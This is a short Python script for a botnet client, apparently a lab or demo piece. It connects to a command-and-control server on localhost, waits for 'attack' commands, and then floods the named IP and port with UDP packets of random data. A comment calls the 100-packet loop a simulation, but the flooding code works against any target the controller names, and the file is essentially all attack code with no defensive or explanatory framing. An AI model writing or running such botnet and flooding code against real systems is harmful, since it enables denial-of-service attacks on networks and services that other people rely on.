import socket
import threading
import time
import random

SERVER = '127.0.0.1'
PORT = 9999

def listen_for_commands(sock):
    while True:
        try:
            cmd = sock.recv(1024).decode().strip()
            if cmd.startswith("attack"):
                _, target_ip, target_port = cmd.split()
                print(f"[BOT] Launching attack on {target_ip}:{target_port}")
                for _ in range(100):  # Simulate 100 packets
                    fake_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    fake_data = random._urandom(1024)
                    fake_sock.sendto(fake_data, (target_ip, int(target_port)))
                    time.sleep(0.05)
        except Exception as e:
            print(f"[BOT] Error: {e}")
            break

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER, PORT))
print("[BOT] Connected to C2 server. Awaiting commands...")

thread = threading.Thread(target=listen_for_commands, args=(sock,))
thread.start()
